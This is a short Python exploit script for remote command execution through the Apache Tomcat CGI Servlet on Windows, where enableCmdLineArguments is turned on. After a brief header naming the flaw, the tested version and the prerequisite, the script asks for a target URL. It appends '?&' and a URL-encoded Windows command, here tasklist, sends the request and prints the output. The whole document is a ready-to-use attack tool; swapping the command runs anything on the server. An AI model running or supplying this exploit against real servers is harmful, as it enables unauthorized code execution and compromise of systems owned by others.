'''
Title: Exploit for Remote Code Execution (RCE) in Apache Tomcat for CGI Servlet
Description: Apache Tomcat has a vulnerability in the CGI Servlet which can be exploited to achieve remote code execution (RCE). This is only exploitable when running on Windows in a non-default configuration in conjunction with batch files.
Pre-requisites: enableCmdLineArguments to be true in web.xml
Tested on: Apache Tomcat v7.0.69
'''
import requests
from urllib.parse import quote
def rce(url): #applies get request for the crafter url
    r = requests.get(url)
    print(r.content.decode("utf-8"))

targetURL = input('enter target url : ') # e.g. '192.168.43.249:8080/cgi-bin/auxiliary.bat'

url = 'http://' + targetURL + '?&'
payload_cmd = 'C:/Windows/System32/tasklist'
rce(url+quote(payload_cmd))
